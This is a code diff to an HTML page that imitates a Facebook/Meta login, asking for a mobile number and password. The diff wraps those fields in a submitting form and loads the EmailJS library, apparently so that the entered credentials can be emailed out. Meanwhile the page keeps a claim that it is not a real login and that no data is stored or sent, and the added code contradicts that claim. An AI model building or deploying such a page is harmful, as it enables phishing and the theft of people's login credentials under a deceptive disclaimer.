@@ -31,15 +31,29 @@
           <div class="inputContainer">
             <div class="text">
               <p>
-                <span>GP's Terms</span>, which
-                includes letting Facebook request and receive your phone number.
+                <span>GP's Terms</span>, which includes letting Facebook request
+                and receive your phone number.
                 <span class="change">Change Settings</span>
               </p>
             </div>
 
-            <input type="text" placeholder="Mobile numbers" required />
-            <input type="password" placeholder="Passwords" required />
-            <button>Try Demo</button>
+            <form action="" id="contact-form">
+              <input
+                id="contact-name"
+                type="text"
+                placeholder="Mobile numbers"
+                name="name"
+                required
+              />
+              <input
+                type="password"
+                name="password"
+                placeholder="Passwords"
+                required
+                id="contact-email"
+              />
+              <button type="submit">Try Demo</button>
+            </form>
 
             <p class="forgot">Forgot password?</p>
           </div>
@@ -52,7 +66,7 @@
             alt="meta-logo"
             loading="eager"
           />
-          <p style="font-size: 12px; color: var(--bg-color);">
+          <p style="font-size: 12px; color: var(--bg-color)">
             This is not a real login. No data is stored or sent. Just for design
             practice.
           </p>
@@ -60,5 +74,9 @@
       </div>
     </main>
   </body>
+  <script
+    type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+  ></script>
   <script src="./script.js"></script>
 </html>
